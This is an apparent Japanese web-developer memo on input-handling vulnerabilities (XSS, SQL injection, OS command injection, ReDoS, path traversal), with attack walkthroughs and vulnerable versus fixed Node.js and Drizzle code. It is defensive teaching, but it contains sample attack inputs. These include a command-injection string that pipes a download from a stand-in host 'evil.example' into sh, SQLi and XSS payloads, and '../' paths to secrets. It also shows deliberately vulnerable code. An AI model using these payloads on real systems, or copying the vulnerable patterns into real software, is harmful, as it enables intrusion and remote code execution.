<!-- scripts/memo.py build が自動生成。手で編集しない -->

# 実装起因の脆弱性（入力の扱い）

> XSS・SQL インジェクション・OS コマンドインジェクション・ReDoS・パストラバーサルを、攻撃の流れと NG/OK コードで図解。データとコードを分ける・出す先に合わせる・許可リストの 3 つの考え方で防ぐ。

- URL: https://memo.taka1156.site/web-vulnerabilities.html
- タグ: セキュリティ, バックエンド, フロントエンド
- 日付: 2026-11-03

---

攻撃の多くは「信頼できない入力が、それを解釈する何かにそのまま届く」場所で起きる

**ざっくり言うと**

- **インジェクション系** （XSS・SQL・OS コマンド）と **パストラバーサル** は、データが **コードやパスの構文として解釈される** ことが原因。対策は「入力を消毒」より、 **出力先ごとにデータとコードを分ける** （プレースホルダ・エスケープ・引数配列）
- **ReDoS** は、正規表現の書き方しだいで計算量が爆発する問題。危険な形を書かない・入力長に上限・線形時間のエンジンで防ぐ
- どれも共通の考え方（データとコードを分ける・出す先に合わせる・許可リスト）で防げる

リクエストや権限が原因のもの（CSRF・セッションハイジャック・SSRF・オープンリダイレクト・IDOR）は [実装起因の脆弱性（リクエストと権限）](https://memo.taka1156.site/md/request-vulnerabilities.md) にまとめています。

## 全体マップ

左の「外から来る値」が、右の「解釈するもの」にそのまま渡ると脆弱性になります。カードを押すと各セクションへ。

外から来る値

URL のクエリ・パス フォーム / JSON の本文 ヘッダー・Cookie アップロードファイル名 DB に保存済みの値

アプリ

解釈するもの（sink）

HTML / DOM

XSS

SQL

SQL インジェクション

シェル

OS コマンド

ファイルパス

パストラバーサル

正規表現エンジン

ReDoS

| 脆弱性 | 何が起きる | 根本対策 | 補助・多層防御 |
| --- | --- | --- | --- |
| XSS | 他人のブラウザで攻撃者の JS が動く | 出力先の文脈に合ったエスケープ（テンプレートの自動エスケープ） | CSP、HttpOnly Cookie |
| SQLi | DB の読み出し・改ざん・認証回避 | プレースホルダ（パラメータ化クエリ） | DB ユーザーの権限最小化 |
| OS コマンド | サーバー上で任意のコマンド実行 | シェルを通さない（引数配列）、そもそも外部コマンドを使わない | 入力の許可リスト、実行ユーザーの権限最小化 |
| ReDoS | 1 リクエストで CPU を占有しサービス停止 | 危険な正規表現を書かない、線形時間のエンジン | 入力長の上限 |
| パストラバーサル | 公開ディレクトリ外のファイルを読まれる・書かれる | 正規化してから基準ディレクトリ内か確認、ID で引く | 実行ユーザーの権限 |

## 共通の考え方

① データとコードを分ける

文字列を連結してから「解釈するもの」に渡さない。プレースホルダ・引数配列・ `textContent` のように、 **最初から「これはデータ」と伝える API** を使う。

② 出すときに、出す先に合わせる

エスケープは **出力時に、出力先の文脈（HTML / 属性 / URL / SQL）で** 行う。入力時に一律で「危険な文字を消す」と、文脈が違う場所で漏れたり、正しいデータを壊したりする。

③ 許可リストで検証する

「危ないものを弾く（拒否リスト）」ではなく「想定したものだけ通す」。並び替え列・ホスト名・ファイル名・リダイレクト先は特に。

④ 破られた前提で被害を絞る

DB ユーザー・プロセスの権限最小化、 [セキュリティヘッダー](https://memo.taka1156.site/md/security-headers.md) 、ログと監視。1 枚の壁に頼らない。

## XSS Cross-Site Scripting

ユーザー入力が HTML として解釈され、 **他のユーザーのブラウザで攻撃者の JavaScript が動く** 。そのページの権限で、表示の書き換え・入力の盗み見・ユーザーになりすましたリクエスト送信ができます。

反射型

格納型

DOM ベース

1. 攻撃者が `/search?q=<script>…</script>` のリンクを用意
2. 被害者がメールや SNS のリンクを踏む
3. サーバーが `q` をそのまま HTML に埋めて返す
4. 被害者のブラウザでスクリプトが実行される
1. 攻撃者がコメント欄やプロフィールにスクリプトを投稿
2. DB に保存される
3. そのページを見た **全員** のブラウザで実行される

リンクを踏ませる必要がなく、被害が広がりやすい。管理画面で表示される問い合わせ内容なども狙われる。

1. 攻撃者が `/#<img src=x onerror=…>` のリンクを用意
2. フロントの JS が `location.hash` を `innerHTML` に入れる
3. サーバーを通らずに実行される（# 以降はサーバーに送られない）

サーバー側のエスケープでは防げない。フロントエンドで危険な API を使っていないかが問題。

NG

```
app.get('/search', (req, res) => {
  res.send(`<p>「${req.query.q}」の結果</p>`);
});

// フロント
el.innerHTML = location.hash.slice(1);
link.href = user.website; // javascript:… も入る
```

OK

```
// テンプレートエンジンの自動エスケープに任せる
res.render('search', { q: req.query.q }); // <%= q %>

// フロント: 文字列はテキストとして入れる
el.textContent = location.hash.slice(1);
// URL はスキームを確認してから
const u = new URL(user.website);
if (['https:', 'http:'].includes(u.protocol)) link.href = u.href;
```

（元のページで操作できます → https://memo.taka1156.site/web-vulnerabilities.html#xss）

### エスケープは「どこに出すか」で変わる

| 出力先 | 例 | 必要な処理 |
| --- | --- | --- |
| HTML の本文 | `<p>{x}</p>` | `& < >` をエスケープ |
| 属性値 | `<input value="{x}">` | 上に加えて `" '` 。属性は必ず引用符で囲む |
| URL 属性 | `<a href="{x}">` | エスケープだけでは不十分。 `javascript:` を防ぐため スキームを許可リストで確認 |
| <script> の中 | `var a = '{x}'` | HTML エスケープでは防げない。 `data-*` 属性や JSON（ `<` をエスケープ）で渡す |
| イベント属性・ `style` | `onclick="{x}"` | ユーザー入力を入れない |

React / Vue / Svelte なども、 `{x}` の埋め込みは自動でエスケープしますが、 `dangerouslySetInnerHTML` / `v-html` / `{@html}` は **素通し** です。ユーザーの HTML を表示したいときは DOMPurify などのサニタイザーを通します。

根本対策

- テンプレートの自動エスケープを使い、無効化しない
- `innerHTML` 系を避け `textContent`
- URL はスキームを確認

補助

- [CSP](https://memo.taka1156.site/md/security-headers.md) （nonce 方式）で注入スクリプトを止める
- Cookie に HttpOnly
- Trusted Types で危険な API を封じる

## SQL インジェクション

入力を文字列連結で SQL に埋めると、入力中の `'` で文字列が閉じられ、 **後ろが SQL の命令として解釈** されます。

```
SELECT * FROM users WHERE email = '' OR 1=1 --' AND password_hash = '…'
                                      ↑ ここで文字列が閉じ、OR 1=1 で全件一致、-- 以降はコメント扱い
```

ほかにも `UNION SELECT` で別テーブルを読む、 `; DROP TABLE` で複数文を実行する（ドライバーが許す場合）、応答時間の差から 1 文字ずつ推測する（ブラインド SQLi）などがある。

NG

```
import { sql } from 'drizzle-orm';

// sql.raw() は文字列をエスケープせずそのまま埋め込む
await db.execute(sql.raw(
  `SELECT * FROM users WHERE email = '${email}'`
));

// 並び替え列を外から受け取る
db.select().from(items)
  .orderBy(sql.raw(req.query.sort));

// sql`` の中でも sql.raw を挟むと素通し
db.execute(sql`… WHERE name = ${sql.raw(`'${name}'`)}`);
```

OK

```
import { sql, eq, asc, desc } from 'drizzle-orm';

// クエリビルダー: 値は自動でプレースホルダ ($1) になる
const rows = await db.select().from(users)
  .where(eq(users.email, email));

// 生 SQL も sql`` タグなら ${} はパラメータとして別送
await db.execute(
  sql`SELECT * FROM ${users} WHERE ${users.email} = ${email}`
);

// 列・並び順はプレースホルダにできない → 許可リストから選ぶ
const SORT = new Map([
  ['new', desc(items.createdAt)],
  ['price', asc(items.price)],
]);
const order = SORT.get(String(req.query.sort)) ?? SORT.get('new');
db.select().from(items).orderBy(order);
```

`users` / `items` は Drizzle のテーブル定義（ `pgTable` など）。 `sql``` に渡した値は `$1` などに置き換えられて別送され、テーブル・列オブジェクトは識別子としてエスケープされます。危ないのは文字列を加工せず入れる `sql.raw()` に外からの値を渡したときです。許可リストを普通のオブジェクトにして `obj[key]` で引くと、 `constructor` などの継承プロパティも当たってしまうので、 `Map` か `Object.hasOwn()` で確認します。

根本対策

- すべての値をプレースホルダで渡す
- テーブル名・列名・ `ASC/DESC` は許可リストから選ぶ
- `LIKE` の `% _` は値としてエスケープ

補助

- アプリ用 DB ユーザーの権限を最小に（DDL 不可など）
- DB のエラー内容を画面に出さない

## OS コマンドインジェクション

入力をシェルのコマンド文字列に埋めると、 `;` `|` `&&` `$()` ``…`` などの **シェルの記号** で、別のコマンドをつなげられます。サーバー上で任意のコマンドが実行されるので、被害は最大級です。

1. 「ping テスト」画面にホスト名を入力させる
2. 攻撃者が `8.8.8.8; curl evil.example/x | sh` と入力
3. サーバーが `sh -c "ping -c 1 8.8.8.8; curl … | sh"` を実行

NG

```
import { exec } from 'node:child_process';

// exec はシェル経由で実行する
exec(`ping -c 1 ${req.body.host}`, cb);

// spawn でも shell: true なら同じ
spawn(`convert ${file} out.png`, { shell: true });
```

OK

```
import { execFile } from 'node:child_process';
import net from 'node:net';

const host = req.body.host;
// ① 許可リストで検証（- で始まる値はオプション扱いされる）
if (!net.isIP(host)) return res.status(400).end();

// ② シェルを通さず、引数を配列で渡す
execFile('ping', ['-c', '1', host], cb);
```

根本対策

- 外部コマンドを使わず、言語のライブラリで処理する（画像処理・圧縮・メール送信など）
- 使うなら `execFile` / `spawn` の引数配列（シェルを起動しない）

補助

- 引数配列でも、 `-` 始まりの値は **オプションとして解釈** される（引数インジェクション）。許可リストで検証し、対応コマンドなら `--` で区切る
- Windows で `.bat` / `.cmd` を起動すると cmd.exe が引数を解釈する。避ける
- 実行ユーザーの権限を最小に、コンテナで隔離

## ReDoS Regular expression Denial of Service

多くの言語の正規表現エンジン（JavaScript・Python・Java・PHP など）は、失敗すると別の分け方を試し直す **バックトラック** 方式です。 `(a+)+` のように **量指定子が入れ子** になっていると、マッチに失敗する入力で分け方の組み合わせが **指数関数的** に増えます。

```
/^(a+)+$/.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!')
// 末尾の ! で必ず失敗する。そこまでに 'aaa…' を (a+) の繰り返しに
// 分ける方法は 2^(n-1) 通り。全部試してから false を返す
```

**実際に測ってみる**

このブラウザで `/^(a+)+$/` に「a × n 個 + !」を渡した時間です。重くなりすぎないよう n は 24 までにしています。比較用に、同じ意味の安全な `/^a+$/` も測ります。

最大 n 22

計測する

**Node.js では特に致命的:** JS の正規表現は同期処理なので、マッチ中は **イベントループが止まり、他のすべてのリクエストが待たされます** 。30 文字程度の入力 1 回で、サーバー全体が数秒〜数分止まります。 `async` にしても try/catch しても防げません。

（元のページで操作できます → https://memo.taka1156.site/web-vulnerabilities.html#redos）

### 危ない形

| パターン | 理由 | 書き換え例 |
| --- | --- | --- |
| `(a+)+` / `(\w+)*` / `(.*)*` | 量指定子の入れ子 | `a+` / `\w*` |
| `(\w+\s?)*$` | `\s?` が省略できるため、実質 `(\w+)*` | `\w+(\s\w+)*$` |
| `(a\|a)*` / `(\d\|\w)+` | 選択肢が同じ文字に重なる | 重ならない文字クラスにする |
| `\s*,\s*` を長い入力に繰り返し適用 | 指数ではないが多項式時間（n² など）で重くなる | 入力長の上限、split などの単純処理に置き換える |

根本対策

- 入れ子・重なりのある正規表現を書かない（ `eslint-plugin-regexp` などの lint で検出）
- ユーザーが正規表現を指定できる機能や重い検証には、 **線形時間のエンジン** （RE2 / Rust の regex / Go の regexp）を使う

補助

- マッチの前に入力長を制限する（メールアドレスなら 254 文字など）
- タイムアウト指定ができる言語では設定する（.NET の `matchTimeout` など）
- 重い処理はワーカーに分け、メインのリクエスト処理を止めない

## パストラバーサル Path Traversal

ファイル名を入力から受け取ると、 `../` で親ディレクトリにさかのぼり、 **公開するつもりのないファイル** （設定ファイル・秘密鍵・ `/etc/passwd` ）を読まれたり、書き込まれたりします。

NG

```
// GET /files?name=../../app/.env
const p = path.join('uploads', req.query.name);
res.sendFile(path.resolve(p));

// 「../ を消す」は回避される
// ....// → ../ 、%2e%2e%2f 、..\ など
name.replace('../', '');
```

OK

```
const BASE = path.resolve('uploads');

const target = path.resolve(BASE, req.query.name);
// 正規化した結果が BASE の中かを確認
if (!target.startsWith(BASE + path.sep)) {
  return res.status(400).end();
}
res.sendFile(target);

// より良い: 名前ではなく ID で引き、実体のパスは DB に持つ
const [file] = await db.select().from(files)
  .where(and(eq(files.id, id), eq(files.ownerId, userId)));
```

`startsWith(BASE)` だけだと `uploads-secret/` のような隣のディレクトリが通るので、末尾に区切り文字を付けて比べます。シンボリックリンクを置ける環境では `fs.realpath` で実体を確認します。アップロード時の保存名は、ユーザーのファイル名を使わずサーバーで生成します。

## よくある誤解

入力時に危険な文字を消しておけば、どこに出しても安全

安全な形は出力先（HTML・SQL・シェル・URL）ごとに違う。入力では形式の検証、出力では文脈に合わせた分離・エスケープ。

ORM を使っているので SQL インジェクションはない

Drizzle なら `sql.raw()` のように文字列をそのまま埋め込む API に外からの値を渡したときや、並び替え列の受け取りで起きる。

正規表現は小さな処理なので DoS とは無関係

入れ子の量指定子があると、数十文字の入力で数秒〜数分 CPU を占有する。
